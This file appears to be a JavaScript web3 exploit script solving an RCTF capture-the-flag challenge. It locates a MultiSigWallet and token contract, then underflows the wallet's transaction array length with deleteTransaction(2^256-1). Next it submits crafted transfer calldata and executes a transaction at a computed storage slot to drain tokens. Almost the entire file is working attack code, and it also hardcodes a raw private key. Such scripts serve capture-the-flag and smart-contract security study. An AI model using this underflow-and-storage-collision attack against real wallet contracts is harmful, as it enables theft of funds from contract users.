let fs = require("fs");
let Web3 = require('web3');
let web3 = new Web3();

// web3@0.20.7
web3.setProvider(new web3.providers.HttpProvider(process.argv[2]));
function getTransactionsByAccount(myaccount, startBlockNumber, endBlockNumber) {
  console.log("Finding contract addresses...")
  contract_count = 0
  if (endBlockNumber == null) {
    endBlockNumber = eth.blockNumber;
    console.log("Using endBlockNumber: " + endBlockNumber);
  }
  if (startBlockNumber == null) {
    startBlockNumber = endBlockNumber - 1000;
    console.log("Using startBlockNumber: " + startBlockNumber);
  }
  console.log("Searching for transactions to/from account \"" + myaccount + "\" within blocks "  + startBlockNumber + " and " + endBlockNumber);

  for (var i = startBlockNumber; i <= endBlockNumber; i++) {
    if (i % 1000 == 0) {
      console.log("Searching block " + i);
    }
    var block = web3.eth.getBlock(i, true);
    if (block != null && block.transactions != null) {
      block.transactions.forEach( function(e) {
        if (myaccount == "*" || myaccount == e.from || myaccount == e.to) {
          let receipt = web3.eth.getTransactionReceipt(e.hash)
          if (receipt && receipt.contractAddress) {
              if(contract_count == 0){
                walletAddr = receipt.contractAddress;
                console.log("find wallet contract at " + walletAddr);
                contract_count = 1
              } else if (contract_count == 1){
                tokenAddr = receipt.contractAddress;
                console.log("find token contract at " + tokenAddr);
                contract_count = 2
              } 
          }
        }
      })
      if (contract_count == 2){
        break;
      }
    }
  }
  return [walletAddr, tokenAddr]
}


function getContract(contractName){
    let source = fs.readFileSync("rctfContracts.json");
    let contracts = JSON.parse(source)["contracts"];

    let abi = JSON.parse(contracts['rctfContracts.sol:'+contractName]['abi']);
    let code = '0x' + contracts['rctfContracts.sol:'+contractName]['bin'];

    let RctfContract = web3.eth.contract(abi);
    return [RctfContract, code];
}

function importAccountUnlock(){
    console.log("Importing account")
    try {
        var account = web3.personal.importRawKey("a35cb86f321fceeee974c3671f0ceed8a6bb86cc3176c4360273675beb179603", "")
    } catch(e) {
        var account = '0x4e5fc5cd21923c49569ea2a745f19168e7aff6e6'
        console.log(e)
    }
    console.log("Unlocking account");
    web3.eth.defaultAccount = account;
    try {
        web3.personal.unlockAccount(web3.eth.defaultAccount, "");
    } catch(e) {
        console.log(e)
        return;
    }
}

function watchEvent(contract){
    console.log('contract:' + contract);
    var msgEvent = contract.Message({fromBlock: 0, toBlock: 'latest'});
    msgEvent.watch(function(error, result){
        if (error) {console.log(error);}
        else{
            console.log(result.args);
        }
    });
}

function getContractInstance(contractName, contractAddr){
    return getContract(contractName)[0].at(contractAddr);
}

function toHexPadding(num, len) {
    hexstr = (num).toString(16);
    return padding(hexstr, len);
}

function padding(hexstr, len){
    var s='';
    for(var i=0; i<len-hexstr.length; i++){
        s += '0';
    }
    return s+hexstr;
}
function addPreZero(num){
  var t = (num+'').length,
  s = '';
  for(var i=0; i<64-t; i++){
    s += '0';
  }
  return s+num;
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function waitGetMined(txHash) {
  while (true) {
    let receipt = web3.eth.getTransactionReceipt(txHash);
    if (receipt) {
      console.log("The contract has been mined in block #"+receipt.blockNumber);
      return receipt;
    }
    console.log("Waiting a mined block to include the tx... currently in block " + web3.eth.blockNumber);
    sleep(4000);
  }
}

//importAccountUnlock();

playeracct='0xd05f77446359c68feb753a542db4f8a69a6566c9'
web3.eth.defaultAccount = playeracct;

owner = '0xa8c29ab108392022b1c46d7706fdf4f596ded3dd'
rst = getTransactionsByAccount(owner,0,1000)
walletAddr = rst[0]
tokenAddr = rst[1]

// get contract instances
wallet = getContractInstance('MultiSigWallet', walletAddr);
token = getContractInstance('SimpleToken', tokenAddr);

var amount_str = toHexPadding(10000000, 64);
var tokenaddr_str = padding(tokenAddr.slice(2), 64);
//console.log('tokenaddr' + tokenaddr_str);

// prepare payloads
var transfer_abi = "0xa9059cbb";
var calldata = transfer_abi + tokenaddr_str + amount_str;
var negativeone = web3.toBigNumber('115792089237316195423570985008687907853269984665640564039457584007913129639935');
var gapid = web3.toBigNumber('24305664690552578208995679717770084829149218172936811659999341037273466734248');

console.log('triggering .length-- underflow;');
txHash = wallet.deleteTransaction(negativeone, {gas: 10000000});
waitGetMined(txHash)

console.log('fill up tx');
//console.log(tokenAddr +', 0, false, ' +calldata);
txHash = wallet.submitTransaction(tokenAddr, 0, false, calldata, {gas: 20000000});
waitGetMined(txHash)

//console.log('testCall')
//txHash = wallet.testCall(tokenAddr, calldata, {gas: 20000000});
//waitGetMined(txHash)

//console.log('!!!'+wallet.testData(gapid))
//console.log('!!!'+wallet.testTxData())

var gaslimit = web3.eth.getBlock(web3.eth.blockNumber-1).gasLimit
console.log('execute tx, cur gaslimit: '+gaslimit);
txHash = wallet.executeTransaction(gapid, {gas: 10000000000});
receipt = waitGetMined(txHash)
console.log(receipt)


watchEvent(wallet);
